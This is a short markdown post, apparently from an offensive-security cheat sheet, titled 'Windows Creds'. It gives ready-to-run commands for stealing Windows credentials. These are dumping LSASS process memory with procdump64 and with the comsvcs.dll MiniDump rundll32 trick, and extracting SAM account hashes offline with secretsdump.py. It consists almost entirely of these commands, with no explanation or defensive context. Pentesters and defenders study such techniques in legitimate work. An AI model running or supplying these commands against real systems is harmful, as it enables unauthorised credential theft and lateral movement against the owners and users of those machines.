---
layout: post
title: "Windows Creds"
tags: ["SAM","LSASS","Secrets"]
os: ["Windows"]
code:
  - title: Dump hashes
    description:
    sample: .\procdump64.exe -accepteula -ma 580 out.dmp2
  - title: Crack offline SAM accounts
    sample: python secretsdump.py -system "systemfile" -sam "samfile"  LOCAL
---

# DUMP

## comsvcs.dll

```powershell
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump
<lsass process ID> C:\Users\Public\lsass.dmp full
```